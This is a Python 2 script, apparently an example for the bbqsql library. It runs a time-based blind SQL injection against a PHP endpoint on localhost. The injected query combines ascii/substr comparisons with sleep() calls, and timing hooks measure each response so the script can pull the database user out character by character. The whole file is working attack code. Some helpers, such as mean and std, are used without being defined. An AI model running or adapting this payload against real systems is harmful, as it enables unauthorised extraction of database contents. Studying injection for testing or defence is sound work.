import bbqsql
import requests
from time import time
from urllib import quote



class loose_cmp_numeric:
    trues  = []
    falses = []
    deviation = 1
    def __init__(self,cmp_var = 'response_time'):
        self.cmp_var = cmp_var

    def add_true(self,obj):
        self.trues.append(getattr(obj,self.cmp_var))

    def add_false(self,obj):
        self.falses.append(getattr(obj,self.cmp_var))

    def check(self,value):
        t = False
        f = False

        if abs(mean(self.trues) - value) < std(self.trues):
            t = True 
        
        if abs(mean(self.falses) - value) < std(self.falses):
            f = True
        
        if not t ^ f:
            raise bbqsql.TrueFalseRangeOverlap
        
        if t:
            self.trues.append(value)
        
        if f:
            self.falses.append(value)
        
        return t


def loose_time_cmp(x,y):
    #times will never match up exactly, so we fudge it a bit
    x = x.response_time
    y = y.response_time
    if abs(x - y) / ((float(x)+y)/2) < 1:
        return 0
    if x > y:
        return 1
    return -1

def my_sender(request):
    #we need a single function that can send requests
    if request.send():
        print request.full_url
        return request.response
    else:
        raise 

def pre_hook(request):
    #hooks for the requests module
    request.start_time = time()
    return request

def post_hook(request):
    #hooks for the requests module
    request.response.response_time = time() - request.start_time
    return request


url = bbqsql.Query('http://127.0.0.1/vulnerable_server.php?query=${query}',encoder=quote)
query = bbqsql.Query("hello' or if(ascii(substr((${user_query:SELECT 'A'} LIMIT 1 OFFSET ${row_index:0}), ${char_index:1}, 1))${comparator:=}${char_val:65},sleep(${sleep:1}),1)=0 or 'a'='b")

#build a requests.Session object to hold settings
session = requests.Session()
#build a request object (but don't send it)
request = session.get(url,return_response=False,hooks = {'pre_request':pre_hook,'post_request':post_hook})
#build a bbqsql.Requester object 
requester = bbqsql.Requester(request = request, send_request_function = my_sender, response_cmp_function = loose_time_cmp)

tech = bbqsql.BlindTechnique(make_request_func=requester.make_request,query=query,concurrency=1)
results = tech.run('SELECT user() from example',sleep=1)

print results

